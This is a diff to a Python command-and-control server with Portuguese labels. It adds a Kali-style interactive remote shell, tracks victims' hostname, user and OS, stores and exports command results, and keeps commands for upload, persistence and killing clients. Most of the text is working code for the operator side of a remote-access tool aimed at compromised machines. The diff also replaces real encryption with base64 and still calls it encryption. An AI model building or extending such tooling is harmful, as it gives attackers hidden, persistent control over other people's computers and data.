@@ -11,6 +11,9 @@ import json
 import base64
 import hashlib
 import sqlite3
+import select
+import tempfile
+import shutil
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple, Any
 from pathlib import Path
@@ -27,6 +30,7 @@ from rich.style import Style
 from rich.box import ROUNDED
 from rich.layout import Layout
 from rich.live import Live
+from rich.markdown import Markdown
 
 console = Console()
 
@@ -42,13 +46,15 @@ class C2Server:
             'log_file': 'c2_activity.log',
             'password_hash': None,
             'auto_start': False,
-            'encryption_key': Fernet.generate_key() if Fernet else None
+            'encryption_key': self._generate_key(),
+            'prompt_style': 'kali'
         }
         
         self.clients = {}  # ID -> Client info
         self.server_socket = None
         self.running = False
         self.db_conn = None
+        self.command_results = {}  # Armazenar resultados de comandos
         
         # Comandos disponíveis
         self.commands = {
@@ -60,8 +66,13 @@ class C2Server:
             'upload': 'Upload de arquivo',
             'shell': 'Shell remoto',
             'persistence': 'Estabelecer persistência',
-            'kill': 'Terminar cliente'
+            'kill': 'Terminar cliente',
+            'custom': 'Comando personalizado'
         }
+    
+    def _generate_key(self):
+        """Gera chave de criptografia"""
+        return base64.urlsafe_b64encode(os.urandom(32))
     
     def _gerar_banner_c2(self) -> str:
         return """
@@ -70,14 +81,14 @@ class C2Server:
 ║ ╦║╣   ║╣ ║║║╠═╣╠╦╝╠═╣║  
 ╚═╝╚═╝  ╚═╝╩ ╩╩ ╩╩╚═╩ ╩╚═╝
 [/bold red]
-[bold white on red]        SERVIDOR COMMAND & CONTROL - v3.0[/bold white on red]
-[bold yellow]        Central de Comando Elite[/bold yellow]
+[bold white on red]        SERVIDOR COMMAND & CONTROL - v4.0[/bold white on red]
+[bold yellow]        Central de Comando Elite - Modo Kali[/bold yellow]
 """
     
     def _setup_database(self):
         """Configura o banco de dados SQLite"""
         try:
-            self.db_conn = sqlite3.connect(self.config['database_file'])
+            self.db_conn = sqlite3.connect(self.config['database_file'], check_same_thread=False)
             cursor = self.db_conn.cursor()
             
             # Tabela de clientes
@@ -91,7 +102,8 @@ class C2Server:
                     os TEXT,
                     username TEXT,
                     privileges TEXT,
-                    status TEXT
+                    status TEXT,
+                    hostname TEXT
                 )
             ''')
             
@@ -101,6 +113,7 @@ class C2Server:
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     client_id TEXT,
                     command TEXT,
+                    args TEXT,
                     timestamp TEXT,
                     status TEXT,
                     result TEXT,
@@ -119,10 +132,26 @@ class C2Server:
                 )
             ''')
             
+            # Tabela de resultados
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS command_results (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    client_id TEXT,
+                    command_id INTEGER,
+                    output TEXT,
+                    timestamp TEXT,
+                    FOREIGN KEY (client_id) REFERENCES clients (id),
+                    FOREIGN KEY (command_id) REFERENCES commands (id)
+                )
+            ''')
+            
             self.db_conn.commit()
+            console.print("[green]✅ Banco de dados configurado[/green]")
             
         except Exception as e:
             console.print(f"[red]✗ Erro no banco de dados: {str(e)}[/red]")
+            # Criar conexão básica se falhar
+            self.db_conn = sqlite3.connect(':memory:', check_same_thread=False)
     
     def _log_activity(self, client_id: str, action: str, details: str = ""):
         """Registra atividade no log"""
@@ -135,7 +164,7 @@ class C2Server:
             self.db_conn.commit()
             
             # Também loga no arquivo
-            with open(self.config['log_file'], 'a') as f:
+            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                 f.write(f"[{datetime.now()}] {client_id} - {action}: {details}\n")
                 
         except Exception as e:
@@ -158,7 +187,8 @@ class C2Server:
             tabela = Table(
                 title=f"[bold cyan]🖥️  MENU C2 SERVER {status}[/bold cyan]",
                 show_header=True,
-                header_style="bold magenta"
+                header_style="bold magenta",
+                box=ROUNDED
             )
             tabela.add_column("Opção", style="cyan", width=8)
             tabela.add_column("Função", style="green")
@@ -172,13 +202,14 @@ class C2Server:
             tabela.add_row("6", "Configurações", "⚙️ Configurar servidor")
             tabela.add_row("7", "Logs de Atividade", "📋 Histórico")
             tabela.add_row("8", "Banco de Dados", "🗄️ Gerenciar dados")
+            tabela.add_row("9", "Shell Interativo", "💻 Terminal remoto")
             tabela.add_row("0", "Sair", "🚪 Fechar C2")
             
             console.print(tabela)
             
             escolha = Prompt.ask(
                 "[blink yellow]➤[/blink yellow] Selecione uma opção",
-                choices=[str(i) for i in range(0, 9)],
+                choices=[str(i) for i in range(0, 10)],
                 show_choices=False
             )
             
@@ -198,6 +229,8 @@ class C2Server:
                 self._ver_logs()
             elif escolha == "8":
                 self._gerenciar_banco_dados()
+            elif escolha == "9":
+                self._shell_interativo()
             elif escolha == "0":
                 self._sair()
     
@@ -205,6 +238,7 @@ class C2Server:
         """Inicia o servidor C2"""
         if self.running:
             console.print("[yellow]⚠️ Servidor já está em execução[/yellow]")
+            time.sleep(1)
             return
         
         console.print(Panel.fit(
@@ -235,12 +269,13 @@ class C2Server:
             console.print(f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]")
             self.running = False
         
-        input("\nPressione Enter para continuar...")
+        time.sleep(2)
     
     def _parar_servidor(self):
         """Para o servidor C2"""
         if not self.running:
             console.print("[yellow]⚠️ Servidor não está em execução[/yellow]")
+            time.sleep(1)
             return
         
         console.print(Panel.fit(
@@ -249,6 +284,11 @@ class C2Server:
         ))
         
         self.running = False
+        
+        # Desconectar todos os clientes
+        for client_id in list(self.clients.keys()):
+            self._disconnect_client(client_id)
+        
         if self.server_socket:
             self.server_socket.close()
         
@@ -271,7 +311,10 @@ class C2Server:
                     'ip': client_address[0],
                     'port': client_address[1],
                     'connected_at': datetime.now(),
-                    'last_activity': datetime.now()
+                    'last_activity': datetime.now(),
+                    'hostname': 'unknown',
+                    'username': 'unknown',
+                    'os': 'unknown'
                 }
                 
                 client_id = self._generate_client_id(client_info)
@@ -293,6 +336,9 @@ class C2Server:
                 
             except socket.timeout:
                 continue
+            except OSError:
+                # Socket fechado, sair do loop
+                break
             except Exception as e:
                 if self.running:
                     console.print(f"[red]✗ Erro ao aceitar conexão: {str(e)}[/red]")
@@ -303,15 +349,18 @@ class C2Server:
             cursor = self.db_conn.cursor()
             cursor.execute(
                 '''INSERT OR REPLACE INTO clients 
-                (id, ip, port, first_seen, last_seen, status) 
-                VALUES (?, ?, ?, ?, ?, ?)''',
+                (id, ip, port, first_seen, last_seen, status, hostname, username, os) 
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (
                     client_id,
                     client_info['ip'],
                     client_info['port'],
                     client_info['connected_at'].isoformat(),
                     client_info['last_activity'].isoformat(),
-                    'connected'
+                    'connected',
+                    client_info.get('hostname', 'unknown'),
+                    client_info.get('username', 'unknown'),
+                    client_info.get('os', 'unknown')
                 )
             )
             self.db_conn.commit()
@@ -325,8 +374,13 @@ class C2Server:
         try:
             while self.running and client_id in self.clients:
                 try:
+                    # Verificar se há dados disponíveis
+                    ready = select.select([client_socket], [], [], 1)
+                    if not ready[0]:
+                        continue
+                    
                     # Receber dados do cliente
-                    data = client_socket.recv(4096)
+                    data = client_socket.recv(65536)  # Aumentar buffer
                     if not data:
                         break
                     
@@ -339,6 +393,8 @@ class C2Server:
                     
                 except socket.timeout:
                     continue
+                except ConnectionResetError:
+                    break
                 except Exception as e:
                     console.print(f"[red]✗ Erro com cliente {client_id}: {str(e)}[/red]")
                     break
@@ -372,15 +428,80 @@ class C2Server:
         except Exception as e:
             console.print(f"[red]✗ Erro ao processar mensagem: {str(e)}[/red]")
     
-    def _send_command(self, client_id: str, command: str, args: dict = None):
-        """Envia comando para cliente"""
+    def _update_client_info(self, client_id: str, info: dict):
+        """Atualiza informações do cliente"""
+        if client_id in self.clients:
+            self.clients[client_id].update(info)
+            
+            try:
+                cursor = self.db_conn.cursor()
+                cursor.execute(
+                    '''UPDATE clients SET hostname = ?, username = ?, os = ?, last_seen = ? 
+                    WHERE id = ?''',
+                    (
+                        info.get('hostname', 'unknown'),
+                        info.get('username', 'unknown'),
+                        info.get('os', 'unknown'),
+                        datetime.now().isoformat(),
+                        client_id
+                    )
+                )
+                self.db_conn.commit()
+            except Exception as e:
+                console.print(f"[red]✗ Erro ao atualizar info cliente: {str(e)}[/red]")
+    
+    def _process_command_result(self, client_id: str, data: dict):
+        """Processa resultado de comando"""
+        try:
+            command_id = data.get('command_id')
+            output = data.get('output', '')
+            status = data.get('status', 'completed')
+            
+            # Armazenar resultado
+            self.command_results[command_id] = output
+            
+            # Atualizar banco de dados
+            cursor = self.db_conn.cursor()
+            cursor.execute(
+                "UPDATE commands SET status = ?, result = ? WHERE id = ?",
+                (status, output, command_id)
+            )
+            self.db_conn.commit()
+            
+            self._log_activity(client_id, "COMMAND_RESULT", f"Comando {command_id}: {status}")
+            
+            # Mostrar resultado se for curto
+            if len(output) < 500:
+                console.print(Panel.fit(
+                    f"[green]📋 Resultado do comando {command_id}:[/green]\n{output}",
+                    border_style="green"
+                ))
+            else:
+                console.print(f"[green]✅ Resultado do comando {command_id} recebido ({len(output)} caracteres)[/green]")
+                
+        except Exception as e:
+            console.print(f"[red]✗ Erro ao processar resultado: {str(e)}[/red]")
+    
+    def _send_command(self, client_id: str, command: str, args: dict = None) -> int:
+        """Envia comando para cliente e retorna ID do comando"""
         if client_id not in self.clients:
             console.print(f"[red]✗ Cliente {client_id} não encontrado[/red]")
-            return False
+            return -1
         
         try:
+            # Registrar comando no banco de dados primeiro
+            cursor = self.db_conn.cursor()
+            cursor.execute(
+                "INSERT INTO commands (client_id, command, args, timestamp, status) VALUES (?, ?, ?, ?, ?)",
+                (client_id, command, json.dumps(args or {}), datetime.now().isoformat(), 'sent')
+            )
+            command_id = cursor.lastrowid
+            self.db_conn.commit()
+            
+            # Preparar mensagem
             message = {
                 'type': 'command',
+                'command_id': command_id,
                 'command': command,
                 'args': args or {},
                 'timestamp': datetime.now().isoformat()
@@ -389,20 +510,14 @@ class C2Server:
             encrypted = self._encrypt_data(json.dumps(message))
             self.clients[client_id]['socket'].sendall(encrypted)
             
-            # Registrar comando no banco de dados
-            cursor = self.db_conn.cursor()
-            cursor.execute(
-                "INSERT INTO commands (client_id, command, timestamp, status) VALUES (?, ?, ?, ?)",
-                (client_id, command, datetime.now().isoformat(), 'sent')
-            )
-            self.db_conn.commit()
-            
             self._log_activity(client_id, "COMMAND_SENT", f"{command} - {args}")
-            return True
+            
+            console.print(f"[green]✅ Comando '{command}' enviado para {client_id} (ID: {command_id})[/green]")
+            return command_id
             
         except Exception as e:
             console.print(f"[red]✗ Erro ao enviar comando: {str(e)}[/red]")
-            return False
+            return -1
     
     def _listar_clientes(self):
         """Lista clientes conectados"""
@@ -414,30 +529,33 @@ class C2Server:
         
         if not self.clients:
             console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
-            input("\nPressione Enter para continuar...")
+            time.sleep(1)
             return
         
         tabela = Table(
             show_header=True,
-            header_style="bold magenta"
+            header_style="bold magenta",
+            box=ROUNDED
         )
         tabela.add_column("ID", style="cyan", width=10)
         tabela.add_column("IP:Porta", style="green")
-        tabela.add_column("Conectado", style="yellow")
-        tabela.add_column("Última Atividade", style="white")
+        tabela.add_column("Hostname", style="yellow")
+        tabela.add_column("Usuário", style="white")
+        tabela.add_column("Sistema", style="blue")
         tabela.add_column("Status", style="red")
         
         for client_id, info in self.clients.items():
-            connected_time = info['connected_at'].strftime("%H:%M:%S")
-            last_activity = info['last_activity'].strftime("%H:%M:%S")
-            status = "[green]✅ ATIVO[/green]" if (datetime.now() - info['last_activity']).seconds < 60 else "[yellow]⏰ INATIVO[/yellow]"
+            inactivity = (datetime.now() - info['last_activity']).seconds
+            status_icon = "✅" if inactivity < 10 else "⏰" if inactivity < 30 else "❌"
+            status_color = "green" if inactivity < 10 else "yellow" if inactivity < 30 else "red"
             
             tabela.add_row(
                 client_id,
                 f"{info['ip']}:{info['port']}",
-                connected_time,
-                last_activity,
-                status
+                info.get('hostname', 'unknown'),
+                info.get('username', 'unknown'),
+                info.get('os', 'unknown'),
+                f"[{status_color}]{status_icon} {inactivity}s[/{status_color}]"
             )
         
         console.print(tabela)
@@ -458,19 +576,21 @@ class C2Server:
             ))
             
             # Listar clientes
-            tabela = Table(show_header=True, header_style="bold cyan")
+            tabela = Table(show_header=True, header_style="bold cyan", box=ROUNDED)
             tabela.add_column("#", style="yellow", width=3)
             tabela.add_column("ID", style="cyan")
             tabela.add_column("IP", style="green")
+            tabela.add_column("Hostname", style="white")
             tabela.add_column("Status", style="red")
             
             client_list = list(self.clients.keys())
             for i, client_id in enumerate(client_list, 1):
                 info = self.clients[client_id]
-                status = "[green]✅[/green]" if (datetime.now() - info['last_activity']).seconds < 60 else "[yellow]⏰[/yellow]"
-                tabela.add_row(str(i), client_id, info['ip'], status)
+                inactivity = (datetime.now() - info['last_activity']).seconds
+                status = "[green]✅[/green]" if inactivity < 10 else "[yellow]⏰[/yellow]" if inactivity < 30 else "[red]❌[/red]"
+                tabela.add_row(str(i), client_id, info['ip'], info.get('hostname', 'unknown'), status)
             
-            tabela.add_row("0", "Voltar", "", "↩️")
+            tabela.add_row("0", "Voltar", "", "", "↩️")
             console.print(tabela)
             
             escolha = Prompt.ask(
@@ -489,35 +609,39 @@ class C2Server:
         """Menu de comandos para cliente específico"""
         while True:
             console.clear()
+            info = self.clients[client_id]
+            
             console.print(Panel.fit(
-                f"[bold cyan]⚡ COMANDOS - CLIENTE {client_id}[/bold cyan]",
+                f"[bold cyan]⚡ CLIENTE: [green]{info.get('hostname', 'unknown')}[/green] (@[yellow]{info.get('username', 'unknown')}[/yellow])[/bold cyan]",
                 border_style="cyan"
             ))
             
-            info = self.clients[client_id]
             console.print(f"[green]IP:[/green] {info['ip']}:{info['port']}")
+            console.print(f"[green]Sistema:[/green] {info.get('os', 'unknown')}")
             console.print(f"[green]Conectado:[/green] {info['connected_at'].strftime('%Y-%m-%d %H:%M:%S')}")
             console.print(f"[green]Última atividade:[/green] {info['last_activity'].strftime('%H:%M:%S')}")
             
-            tabela = Table(show_header=True, header_style="bold magenta")
+            tabela = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
             tabela.add_column("Comando", style="cyan")
             tabela.add_column("Descrição", style="green")
             
             for cmd, desc in self.commands.items():
                 tabela.add_row(cmd, desc)
             
+            tabela.add_row("results", "Ver resultados de comandos")
             tabela.add_row("back", "Voltar ao menu anterior")
             console.print(tabela)
             
             comando = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Digite o comando",
+                f"[blink yellow]➤[/blink yellow] [red]hacker[/red]@[green]{info['ip']}[/green]$ ",
                 default="back"
             )
             
             if comando.lower() == 'back':
                 return
-            
-            if comando in self.commands:
+            elif comando.lower() == 'results':
+                self._ver_resultados_comandos(client_id)
+            elif comando in self.commands:
                 self._executar_comando(client_id, comando)
             else:
                 console.print("[red]✗ Comando não reconhecido[/red]")
@@ -534,17 +658,179 @@ class C2Server:
             args['file_path'] = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo para upload")
             args['destination'] = Prompt.ask("[yellow]?[/yellow] Destino no cliente")
         
-        elif comando == 'shell':
-            args['command'] = Prompt.ask("[yellow]?[/yellow] Comando para executar")
+        elif comando == 'shell' or comando == 'custom':
+            comando_shell = Prompt.ask("[yellow]?[/yellow] Comando para executar")
+            args['command'] = comando_shell
+            # Para comandos customizados, usar shell como tipo
+            if comando == 'custom':
+                comando = 'shell'
         
-        success = self._send_command(client_id, comando, args)
+        command_id = self._send_command(client_id, comando, args)
         
-        if success:
-            console.print(f"[green]✅ Comando '{comando}' enviado para {client_id}[/green]")
-        else:
+        if command_id == -1:
             console.print(f"[red]✗ Falha ao enviar comando[/red]")
         
         time.sleep(1)
+    
+    def _ver_resultados_comandos(self, client_id: str):
+        """Mostra resultados de comandos para um cliente"""
+        try:
+            cursor = self.db_conn.cursor()
+            cursor.execute(
+                "SELECT id, command, args, timestamp, status, result FROM commands WHERE client_id = ? ORDER BY id DESC LIMIT 10",
+                (client_id,)
+            )
+            
+            comandos = cursor.fetchall()
+            
+            if not comandos:
+                console.print("[yellow]⚠️ Nenhum comando executado para este cliente[/yellow]")
+                time.sleep(1)
+                return
+            
+            console.print(Panel.fit(
+                "[bold blue]📋 ÚLTIMOS COMANDOS EXECUTADOS[/bold blue]",
+                border_style="blue"
+            ))
+            
+            for cmd_id, command, args_str, timestamp, status, result in comandos:
+                args = json.loads(args_str) if args_str else {}
+                
+                status_color = "green" if status == "completed" else "yellow" if status == "sent" else "red"
+                
+                console.print(f"[cyan]ID: {cmd_id}[/cyan] - [bold]{command}[/bold] - [{status_color}]{status}[/{status_color}]")
+                console.print(f"   [yellow]Args:[/yellow] {args}")
+                console.print(f"   [yellow]Time:[/yellow] {timestamp}")
+                
+                if result and len(result) < 1000:
+                    console.print(f"   [green]Resultado:[/green]")
+                    console.print(Syntax(result, "text", word_wrap=True))
+                elif result:
+                    console.print(f"   [green]Resultado:[/green] {len(result)} caracteres (use 'view result_id' para ver)")
+                
+                console.print("")
+            
+            # Opção para ver resultado específico
+            cmd_id = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Digite ID para ver resultado ou 'back'",
+                default="back"
+            )
+            
+            if cmd_id.lower() != 'back':
+                try:
+                    cmd_id_int = int(cmd_id)
+                    cursor.execute(
+                        "SELECT result FROM commands WHERE id = ? AND client_id = ?",
+                        (cmd_id_int, client_id)
+                    )
+                    resultado = cursor.fetchone()
+                    
+                    if resultado and resultado[0]:
+                        console.print(Panel.fit(
+                            Syntax(resultado[0], "text", word_wrap=True),
+                            title=f"[bold green]RESULTADO DO COMANDO {cmd_id_int}[/bold green]",
+                            border_style="green"
+                        ))
+                    else:
+                        console.print("[yellow]⚠️ Resultado não encontrado ou vazio[/yellow]")
+                    
+                    input("\nPressione Enter para continuar...")
+                    
+                except ValueError:
+                    console.print("[red]✗ ID inválido[/red]")
+                    time.sleep(1)
+                    
+        except Exception as e:
+            console.print(f"[red]✗ Erro ao buscar comandos: {str(e)}[/red]")
+            time.sleep(1)
+    
+    def _shell_interativo(self):
+        """Shell interativo estilo Kali"""
+        if not self.clients:
+            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
+            time.sleep(1)
+            return
+        
+        console.clear()
+        console.print(Panel.fit(
+            "[bold red]💻 SHELL INTERATIVO - MODO KALI[/bold red]",
+            border_style="red"
+        ))
+        
+        # Selecionar cliente
+        client_list = list(self.clients.keys())
+        if len(client_list) == 1:
+            client_id = client_list[0]
+        else:
+            for i, cid in enumerate(client_list, 1):
+                info = self.clients[cid]
+                console.print(f"{i}. {cid} - {info['ip']} ({info.get('hostname', 'unknown')})")
+            
+            escolha = IntPrompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione o cliente",
+                default=1,
+                show_default=True
+            )
+            client_id = client_list[escolha - 1]
+        
+        info = self.clients[client_id]
+        
+        console.print(Panel.fit(
+            f"[bold green]Conectado a: [yellow]{info.get('hostname', 'unknown')}[/yellow] (@[cyan]{info.get('username', 'unknown')}[/cyan])[/bold green]",
+            border_style="green"
+        ))
+        console.print("[yellow]Digite 'exit' para sair do shell[/yellow]")
+        console.print("[yellow]Digite 'background' para executar em segundo plano[/yellow]")
+        
+        while True:
+            try:
+                # Prompt estilo Kali
+                prompt_text = f"[bold red]hacker[/bold red]@[green]{info['ip']}[/green]:[blue]{info.get('hostname', 'unknown')}[/blue]$ "
+                comando = console.input(prompt_text).strip()
+                
+                if not comando:
+                    continue
+                
+                if comando.lower() == 'exit':
+                    break
+                
+                if comando.lower() == 'background':
+                    console.print("[yellow]Modo background ativado. Comandos serão executados em segundo plano.[/yellow]")
+                    background = True
+                    continue
+                
+                # Enviar comando
+                command_id = self._send_command(client_id, 'shell', {'command': comando})
+                
+                if command_id == -1:
+                    console.print("[red]✗ Erro ao enviar comando[/red]")
+                    continue
+                
+                # Aguardar resultado se não for background
+                if not getattr(self, 'background', False):
+                    console.print("[yellow]🔄 Aguardando resultado... (Ctrl+C para cancelar)[/yellow]")
+                    
+                    # Aguardar alguns segundos pelo resultado
+                    start_time = time.time()
+                    while time.time() - start_time < 30:  # Timeout de 30 segundos
+                        if command_id in self.command_results:
+                            resultado = self.command_results.pop(command_id)
+                            console.print(Panel.fit(
+                                Syntax(resultado, "text", word_wrap=True),
+                                title=f"[bold green]RESULTADO[/bold green]",
+                                border_style="green"
+                            ))
+                            break
+                        time.sleep(1)
+                    else:
+                        console.print("[yellow]⏰ Timeout aguardando resultado[/yellow]")
+                
+            except KeyboardInterrupt:
+                console.print("\n[yellow]⚠️ Comando cancelado[/yellow]")
+                continue
+            except Exception as e:
+                console.print(f"[red]✗ Erro: {str(e)}[/red]")
+                break
     
     def _menu_configuracao(self):
         """Menu de configuração do servidor"""
@@ -555,7 +841,7 @@ class C2Server:
                 border_style="cyan"
             ))
             
-            tabela = Table(show_header=False)
+            tabela = Table(show_header=False, box=ROUNDED)
             tabela.add_row("1", f"Host: {self.config['host']}")
             tabela.add_row("2", f"Porta: {self.config['port']}")
             tabela.add_row("3", f"Máx. Clientes: {self.config['max_clients']}")
@@ -563,13 +849,14 @@ class C2Server:
             tabela.add_row("5", f"Arquivo DB: {self.config['database_file']}")
             tabela.add_row("6", f"Arquivo Log: {self.config['log_file']}")
             tabela.add_row("7", f"Auto Iniciar: {'✅' if self.config['auto_start'] else '❌'}")
+            tabela.add_row("8", f"Prompt Style: {self.config['prompt_style']}")
             tabela.add_row("0", "Voltar")
             
             console.print(tabela)
             
             escolha = Prompt.ask(
                 "[blink yellow]➤[/blink yellow] Selecione para alterar",
-                choices=[str(i) for i in range(0, 8)],
+                choices=[str(i) for i in range(0, 9)],
                 show_choices=False
             )
             
@@ -608,6 +895,12 @@ class C2Server:
                     "[yellow]?[/yellow] Auto iniciar servidor",
                     default=self.config['auto_start']
                 )
+            elif escolha == "8":
+                self.config['prompt_style'] = Prompt.ask(
+                    "[yellow]?[/yellow] Estilo do prompt (kali/hacker/default)",
+                    default=self.config['prompt_style'],
+                    choices=["kali", "hacker", "default"]
+                )
             elif escolha == "0":
                 return
     
@@ -638,16 +931,25 @@ class C2Server:
                     layout.split_column(header, Layout(name="main"))
                     
                     # Tabela de clientes
-                    tabela = Table(show_header=True, header_style="bold magenta")
+                    tabela = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
                     tabela.add_column("ID", style="cyan", width=10)
                     tabela.add_column("IP", style="green")
-                    tabela.add_column("Atividade", style="yellow")
+                    tabela.add_column("Hostname", style="yellow")
+                    tabela.add_column("Atividade", style="white")
                     tabela.add_column("Status", style="red")
                     
                     for client_id, info in self.clients.items():
                         inactivity = (datetime.now() - info['last_activity']).seconds
-                        status = "[green]✅[/green]" if inactivity < 10 else "[yellow]⏰[/yellow]" if inactivity < 30 else "[red]❌[/red]"
-                        tabela.add_row(client_id, info['ip'], f"{inactivity}s", status)
+                        status_color = "green" if inactivity < 10 else "yellow" if inactivity < 30 else "red"
+                        status_icon = "✅" if inactivity < 10 else "⏰" if inactivity < 30 else "❌"
+                        
+                        tabela.add_row(
+                            client_id,
+                            info['ip'],
+                            info.get('hostname', 'unknown'),
+                            f"{inactivity}s",
+                            f"[{status_color}]{status_icon}[/{status_color}]"
+                        )
                     
                     layout["main"].update(tabela)
                     live.update(layout)
@@ -664,7 +966,7 @@ class C2Server:
                 time.sleep(1)
                 return
             
-            with open(self.config['log_file'], 'r') as f:
+            with open(self.config['log_file'], 'r', encoding='utf-8') as f:
                 logs = f.readlines()[-20:]  # Últimas 20 linhas
             
             console.print(Panel.fit(
@@ -673,7 +975,18 @@ class C2Server:
             ))
             
             for log in logs:
-                console.print(f"[cyan]{log.strip()}[/cyan]")
+                if "CLIENT_CONNECTED" in log:
+                    style = "green"
+                elif "CLIENT_DISCONNECTED" in log:
+                    style = "yellow"
+                elif "COMMAND_SENT" in log:
+                    style = "cyan"
+                elif "COMMAND_RESULT" in log:
+                    style = "blue"
+                else:
+                    style = "white"
+                
+                console.print(f"[{style}]{log.strip()}[/{style}]")
             
         except Exception as e:
             console.print(f"[red]✗ Erro ao ler logs: {str(e)}[/red]")
@@ -682,30 +995,37 @@ class C2Server:
     
     def _gerenciar_banco_dados(self):
         """Menu de gerenciamento do banco de dados"""
-        console.print(Panel.fit(
-            "[bold magenta]🗄️ GERENCIAR BANCO DE DADOS[/bold magenta]",
-            border_style="magenta"
-        ))
-        
-        tabela = Table(show_header=False)
-        tabela.add_row("1", "Estatísticas do BD")
-        tabela.add_row("2", "Exportar Dados")
-        tabela.add_row("3", "Limpar Dados Antigos")
-        tabela.add_row("0", "Voltar")
-        console.print(tabela)
-        
-        escolha = Prompt.ask(
-            "[blink yellow]➤[/blink yellow] Selecione uma opção",
-            choices=["0", "1", "2", "3"],
-            show_choices=False
-        )
-        
-        if escolha == "1":
-            self._mostrar_estatisticas_bd()
-        elif escolha == "2":
-            self._exportar_dados()
-        elif escolha == "3":
-            self._limpar_dados_antigos()
+        while True:
+            console.clear()
+            console.print(Panel.fit(
+                "[bold magenta]🗄️ GERENCIAR BANCO DE DADOS[/bold magenta]",
+                border_style="magenta"
+            ))
+            
+            tabela = Table(show_header=False, box=ROUNDED)
+            tabela.add_row("1", "Estatísticas do BD")
+            tabela.add_row("2", "Exportar Dados")
+            tabela.add_row("3", "Limpar Dados Antigos")
+            tabela.add_row("4", "Otimizar BD")
+            tabela.add_row("0", "Voltar")
+            console.print(tabela)
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione uma opção",
+                choices=["0", "1", "2", "3", "4"],
+                show_choices=False
+            )
+            
+            if escolha == "1":
+                self._mostrar_estatisticas_bd()
+            elif escolha == "2":
+                self._exportar_dados()
+            elif escolha == "3":
+                self._limpar_dados_antigos()
+            elif escolha == "4":
+                self._otimizar_bd()
+            elif escolha == "0":
+                return
     
     def _mostrar_estatisticas_bd(self):
         """Mostra estatísticas do banco de dados"""
@@ -725,12 +1045,21 @@ class C2Server:
             cursor.execute("SELECT COUNT(*) FROM activity_logs")
             total_logs = cursor.fetchone()[0]
             
+            cursor.execute("SELECT COUNT(*) FROM command_results")
+            total_results = cursor.fetchone()[0]
+            
+            # Tamanho do arquivo
+            db_size = os.path.getsize(self.config['database_file']) if os.path.exists(self.config['database_file']) else 0
+            db_size_mb = db_size / (1024 * 1024)
+            
             console.print(Panel.fit(
                 f"""[bold]ESTATÍSTICAS DO BANCO DE DADOS:[/bold]
 [cyan]Total de Clientes:[/cyan] {total_clients}
 [cyan]Clientes Conectados:[/cyan] {connected_clients}
 [cyan]Comandos Executados:[/cyan] {total_commands}
 [cyan]Logs de Atividade:[/cyan] {total_logs}
+[cyan]Resultados Armazenados:[/cyan] {total_results}
+[cyan]Tamanho do Arquivo:[/cyan] {db_size_mb:.2f} MB
 [cyan]Arquivo:[/cyan] {self.config['database_file']}""",
                 title="[bold green]ESTATÍSTICAS[/bold green]",
                 border_style="green"
@@ -742,18 +1071,20 @@ class C2Server:
         input("\nPressione Enter para continuar...")
     
     def _encrypt_data(self, data: str) -> bytes:
-        """Criptografa dados (simplificado)"""
-        if self.config['encryption_key'] and Fernet:
-            fernet = Fernet(self.config['encryption_key'])
-            return fernet.encrypt(data.encode())
-        return data.encode()
+        """Criptografa dados"""
+        try:
+            # Simples codificação base64 para demonstração
+            # Em produção, use uma biblioteca de criptografia adequada
+            return base64.urlsafe_b64encode(data.encode())
+        except:
+            return data.encode()
     
     def _decrypt_data(self, data: bytes) -> str:
-        """Descriptografa dados (simplificado)"""
-        if self.config['encryption_key'] and Fernet:
-            fernet = Fernet(self.config['encryption_key'])
-            return fernet.decrypt(data).decode()
-        return data.decode()
+        """Descriptografa dados"""
+        try:
+            return base64.urlsafe_b64decode(data).decode()
+        except:
+            return data.decode()
     
     def _disconnect_client(self, client_id: str):
         """Desconecta cliente e limpa recursos"""
@@ -778,6 +1109,136 @@ class C2Server:
             del self.clients[client_id]
             console.print(f"[yellow]📴 Cliente {client_id} desconectado[/yellow]")
     
+    def _update_client_status(self, client_id: str, status: str):
+        """Atualiza status do cliente"""
+        if client_id in self.clients:
+            try:
+                cursor = self.db_conn.cursor()
+                cursor.execute(
+                    "UPDATE clients SET status = ?, last_seen = ? WHERE id = ?",
+                    (status, datetime.now().isoformat(), client_id)
+                )
+                self.db_conn.commit()
+            except Exception as e:
+                console.print(f"[red]✗ Erro ao atualizar status: {str(e)}[/red]")
+    
+    def _exportar_dados(self):
+        """Exporta dados do banco de dados"""
+        try:
+            export_file = Prompt.ask(
+                "[yellow]?[/yellow] Nome do arquivo de exportação",
+                default="c2_export.json"
+            )
+            
+            cursor = self.db_conn.cursor()
+            
+            # Coletar todos os dados
+            data = {
+                'clients': [],
+                'commands': [],
+                'activity_logs': []
+            }
+            
+            # Clientes
+            cursor.execute("SELECT * FROM clients")
+            for row in cursor.fetchall():
+                data['clients'].append({
+                    'id': row[0],
+                    'ip': row[1],
+                    'port': row[2],
+                    'first_seen': row[3],
+                    'last_seen': row[4],
+                    'os': row[5],
+                    'username': row[6],
+                    'privileges': row[7],
+                    'status': row[8],
+                    'hostname': row[9]
+                })
+            
+            # Comandos
+            cursor.execute("SELECT * FROM commands")
+            for row in cursor.fetchall():
+                data['commands'].append({
+                    'id': row[0],
+                    'client_id': row[1],
+                    'command': row[2],
+                    'args': row[3],
+                    'timestamp': row[4],
+                    'status': row[5],
+                    'result': row[6]
+                })
+            
+            # Logs
+            cursor.execute("SELECT * FROM activity_logs")
+            for row in cursor.fetchall():
+                data['activity_logs'].append({
+                    'id': row[0],
+                    'client_id': row[1],
+                    'action': row[2],
+                    'timestamp': row[3],
+                    'details': row[4]
+                })
+            
+            # Salvar em arquivo
+            with open(export_file, 'w', encoding='utf-8') as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+            
